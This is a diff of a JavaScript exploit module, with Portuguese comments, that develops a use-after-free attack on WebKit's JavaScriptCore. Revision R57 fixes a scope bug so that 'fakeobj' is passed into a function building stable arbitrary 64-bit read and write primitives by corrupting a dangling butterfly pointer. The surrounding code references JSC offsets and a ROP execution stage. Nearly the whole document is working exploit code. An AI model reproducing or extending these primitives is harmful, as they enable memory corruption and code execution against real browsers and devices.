@@ -1,22 +1,22 @@
-// js/script3/testArrayBufferVictimCrash.mjs (R56 - R/W Real com Gerenciamento de Estado)
+// js/script3/testArrayBufferVictimCrash.mjs (R57 - Correção de Escopo)
 // =======================================================================================
-// ESTRATÉGIA R56:
-// Corrigido o erro lógico onde read64(addr) retornava addr.
-// A nova implementação de read64/write64 gerencia o estado do UAF, salvando e
-// restaurando o ponteiro do butterfly a cada operação, garantindo estabilidade.
+// ESTRATÉGIA R57:
+// Corrigido o erro "fakeobj is not defined".
+// A primitiva `fakeobj` agora é passada corretamente como parâmetro para a função
+// `buildStatefulArbitraryReadWrite`, resolvendo o problema de escopo.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "ROP_Execution_RealRW_R56";
+export const FNAME_MODULE = "ROP_Execution_RealRW_R57";
 
 const ftoi = (val) => new AdvancedInt64(new Uint32Array(new Float64Array([val]).buffer)[0], new Uint32Array(new Float64Array([val]).buffer)[1]);
 const itof = (val) => { const b = new ArrayBuffer(8); const i = new Uint32Array(b); i[0] = val.low(); i[1] = val.high(); return new Float64Array(b)[0]; };
 
 export async function runStableUAFPrimitives_R51() {
-    logS3(`--- Iniciando ${FNAME_MODULE}: R/W com Gerenciamento de Estado ---`, "test");
+    logS3(`--- Iniciando ${FNAME_MODULE}: Correção de Escopo ---`, "test");
     
     let final_result = { success: false, message: "Falha na cadeia de exploit." };
 
@@ -39,7 +39,8 @@ export async function runStableUAFPrimitives_R51() {
         logS3("   Primitivas `addrof` e `fakeobj` construídas.", "vuln");
 
         logS3("--- FASE 3: Construindo Leitura/Escrita Arbitrária (ESTÁVEL) ---", "subtest");
-        const { read64, write64 } = buildStatefulArbitraryReadWrite(dangling_ref, addrof, holder);
+        // CORRIGIDO: Passando 'fakeobj' como parâmetro.
+        const { read64, write64 } = buildStatefulArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder);
         logS3("   Primitivas `read64` e `write64` REAIS e ESTÁVEIS construídas!", "good");
         
         logS3("--- FASE 4: Verificando os endereços base na MEMÓRIA REAL ---", "subtest");
@@ -70,32 +71,26 @@ export async function runStableUAFPrimitives_R51() {
 
 
 // =======================================================================================
-// IMPLEMENTAÇÃO REAL E ESTÁVEL DE LEITURA/ESCRITA ARBITRÁRIA (R56)
+// IMPLEMENTAÇÃO REAL E ESTÁVEL DE LEITURA/ESCRITA ARBITRÁRIA (R57)
 // =======================================================================================
-function buildStatefulArbitraryReadWrite(dangling_ref, addrof, holder) {
+// CORRIGIDO: Adicionado 'fakeobj' à lista de parâmetros.
+function buildStatefulArbitraryReadWrite(dangling_ref, addrof, fakeobj, holder) {
     // Estratégia de Gerenciamento de Estado:
-    // As primitivas addrof/fakeobj dependem de `dangling_ref.a` apontar para o objeto `holder`.
-    // Para ler/escrever, precisamos mudar `dangling_ref.a` temporariamente.
-    // A chave para a estabilidade é RESTAURAR `dangling_ref.a` para seu estado original
-    // (apontando para `holder`) após cada operação.
+    // Preservar o estado do `dangling_ref.a` (apontando para `holder`) é a chave para a estabilidade.
     
-    // 1. Salvar o estado original (o ponteiro para o objeto `holder`).
-    //    Não podemos salvar o ponteiro diretamente, mas podemos salvá-lo *dentro* do próprio holder.
+    // Salva o estado original (o ponteiro para o objeto `holder`).
     holder.original_a = dangling_ref.a;
 
     const read64 = (address) => {
-        // 2. Corromper `dangling_ref.a` para apontar para o endereço que queremos LER.
-        //    O motor JS espera que o butterfly aponte para uma estrutura de butterfly,
-        //    não para dados brutos. Apontar para `address - 0x8` alinha o header do butterfly
-        //    de forma que o primeiro elemento de dados comece em `address`.
-        dangling_ref.a = { dummy: 0 }; // Atribuição para quebrar a referência antiga
+        // Corrompe `dangling_ref.a` para apontar para o endereço que queremos LER.
+        // `address.sub(8)` alinha o ponteiro para que a leitura do primeiro elemento do array
+        // corresponda exatamente ao conteúdo no `address`.
         dangling_ref.a = fakeobj(address.sub(8));
 
-        // 3. Ler o valor. `dangling_ref.b` agora lê diretamente da memória no `address`.
+        // Lê o valor. `dangling_ref.b` agora lê diretamente da memória no `address`.
         const result = ftoi(dangling_ref.b);
         
-        // 4. RESTAURAR O ESTADO! Isso é crucial.
-        //    Reatribuímos o ponteiro original salvo de volta para `dangling_ref.a`.
+        // RESTAURA O ESTADO! Isso é crucial para a próxima chamada de `addrof` ou `fakeobj`.
         dangling_ref.a = holder.original_a;
 
         return result;
@@ -103,7 +98,6 @@ function buildStatefulArbitraryReadWrite(dangling_ref, addrof, holder) {
 
     const write64 = (address, value) => {
         // Mesma lógica: corromper, operar, restaurar.
-        dangling_ref.a = { dummy: 0 };
         dangling_ref.a = fakeobj(address.sub(8));
         
         dangling_ref.b = itof(value);
@@ -112,7 +106,7 @@ function buildStatefulArbitraryReadWrite(dangling_ref, addrof, holder) {
     };
 
     // Para a primeira chamada `fakeobj` dentro de `read64` funcionar, o estado de
-    // `dangling_ref.a` precisa ser o `holder`. Vamos garantir isso com uma chamada inicial.
+    // `dangling_ref.a` precisa ser o `holder`. Garantimos isso com uma chamada inicial a `addrof`.
     addrof({dummy_setup: 1});
 
     return { read64, write64 };
